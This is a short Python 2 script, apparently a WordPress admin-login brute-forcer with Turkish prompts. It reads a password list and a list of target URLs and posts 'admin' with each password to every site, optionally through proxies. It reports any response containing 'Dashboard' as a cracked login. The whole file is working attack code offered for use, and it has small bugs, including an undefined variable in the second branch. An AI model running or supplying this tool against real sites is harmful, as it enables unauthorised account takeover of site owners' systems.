"""

            author: @Hacknology
            contact: utkucolak05@gmail.com
            date: 05.06.2017
"""

import requests,sys,proxy
from colorama import Fore, Back, Style, init

red     = Fore.RED
cyan    = Fore.CYAN
blue    = Fore.BLUE
green   = Fore.GREEN
white   = Fore.WHITE
yellow  = Fore.YELLOW
magenta = Fore.MAGENTA
bright  = Style.BRIGHT
def run():
    sifreler = open(raw_input("PW: "), "r").readlines()
    url = open(raw_input("URL: "), "r").readlines()
    proxy_check = raw_input(bright+yellow+"[*]Proxy kullanilsin mi (evet/hayir)? ==> ")
    if proxy_check == "evet":
        proxym = proxy.use_proxy()
        
        for site in url:         
            site.strip()
            for pw in sifreler:
                session = requests.Session()
                try:
                    r = session.post(site, data={"log":"admin","pwd":pw}, proxies=proxym, timeout=5)
                    
                except(requests.exceptions.ConnectionError):
                    continue
                if "Dashboard" in r.text:
                    print bright + green + "[+] Yey! " + site + "-->" + pw
                    
    elif proxy_check == "hayir":
        
        
        for site in url:
            site.strip()
            for pw in sifreler:
                session = requests.Session()
                try:
                    r = session.post(site, data={"log":"admin","pwd":pw}, timeout=5)
                except(requests.exceptions.ConnectionError):
                    continue
                if "Dashboard" in r.text:
                    print bright + green + "[+] Buldum! " + site + "-->" + sifre
   
            
